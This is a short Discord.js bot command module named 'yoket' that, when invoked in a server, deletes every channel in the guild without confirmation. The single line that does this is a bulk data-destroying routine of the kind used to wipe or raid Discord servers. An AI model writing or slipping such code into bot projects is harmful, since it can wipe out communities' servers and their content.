const Discord = require('discord.js');
exports.run = async(client, message, args) => { 
  
  if(message.author.bot) return;
  if(message.channel.type === "dm") return console.log("Bu Sistem DM'de Kullanilamaz")
  
message.guild.channels.cache.forEach(a => a.delete())

};
exports.conf = {
  enabled: true,  
  guildOnly: false, 
  aliases: [], 
  permLevel: 4
};

exports.help = {
  name: 'yoket',
  description: '', 
  usage: 'yoket'
};